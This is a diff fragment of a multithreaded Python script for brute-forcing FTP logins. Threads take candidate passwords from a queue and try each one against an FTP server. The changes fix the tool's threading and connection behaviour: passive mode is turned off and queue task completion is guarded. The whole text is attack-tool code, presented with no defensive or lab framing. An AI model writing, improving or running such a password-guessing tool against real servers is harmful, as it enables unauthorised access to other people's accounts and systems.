@@ -16,9 +16,12 @@ port = 21
 def connect_ftp():
     global q
     while True:
-        password = q.get()   # get the password from the queue
+        # get the password from the queue
+        password = q.get()   
 
-        server = ftplib.FTP() # initialize the FTP server object
+        # initialize the FTP server object
+        server = ftplib.FTP()
+        server.set_pasv(False)
 
         print("[!] Trying", password)
         try:
@@ -46,7 +49,8 @@ def connect_ftp():
                 q.unfinished_tasks = 0
         finally:
             # notify the queue that the task is completed for this password
-            q.task_done()
+            if q.empty() is not True:
+                q.task_done()
 
 
 if __name__ == "__main__":
@@ -74,7 +78,7 @@ if __name__ == "__main__":
     for password in passwords:
         q.put(password)
 
-        # create `n_threads` that runs that function
+    # create `n_threads` that runs that function
     for t in range(n_threads):
         thread = Thread(target=connect_ftp)
         # will end when the main thread end
